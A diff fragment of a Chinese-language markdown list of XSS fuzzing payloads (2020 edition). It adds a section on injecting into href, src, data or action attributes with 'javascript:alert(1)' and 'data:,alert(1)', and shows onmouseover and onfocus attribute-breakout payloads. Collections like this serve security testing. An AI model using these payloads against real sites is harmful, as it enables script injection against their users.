@@ -33,4 +33,8 @@ xss漏洞模糊测试有效载荷的最佳集合 2020版 <br>
 "onmouseover=alert(1) //
 "autofocus onfocus=alert(1) //
 ```
-
+**4.HTML Injection - Source（HTML注入-源）** <br>
+当输入的payload，被作为以下HTML标签属性的值使用时：`href`，`src`，`data`或`action`。payload中的`src`属性值可以是一个URL或者`"data:,alert(1)"`。
+```
+javascript:alert(1)
+```
